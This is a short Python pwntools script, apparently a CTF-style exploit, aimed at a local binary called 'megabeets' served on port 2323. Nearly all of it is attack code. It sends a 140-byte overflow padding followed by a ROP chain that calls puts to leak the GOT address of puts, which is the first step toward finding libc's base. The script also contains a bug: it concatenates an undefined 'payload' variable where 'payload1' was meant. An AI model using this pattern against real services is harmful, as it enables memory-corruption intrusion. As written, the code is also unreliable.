import struct 
import socket
from pwn import *


# Networking Connect Create
#s = socket.socket()
#s.connect(("localhost",2323))
r = remote('127.0.0.1',2323)

#### Binary Address & offsets

## Address
puts_plt = 0x8048390
puts_got = 0x804a014
entry_point = 0x80483d0

## Offets 


### make payload 
payload1  =  "A"*140
ropchain =  p32(puts_plt)
ropchain += p32(entry_point)
ropchain += p32(puts_got)

### sending payload to binary
payload =  payload + ropchain


r.send(payload)
#r.sendline(payload)
#data = s.recv(1024)
data = r.recvall()
#leck = u32(data)

print(data)
#log.info("libc base: 0x%x" % leck)

#puts_off_libc = struct.unpack("<L",data)[0]
#print(puts_off_libc)
#r.close()

#########################################################

server = process(['socat', 'tcp-listen:2323,fork,reuseaddr', 'exec:./megabeets'])
# Connect to the server
s=remote("127.0.0.1",2323)
s.recvuntil(": ")
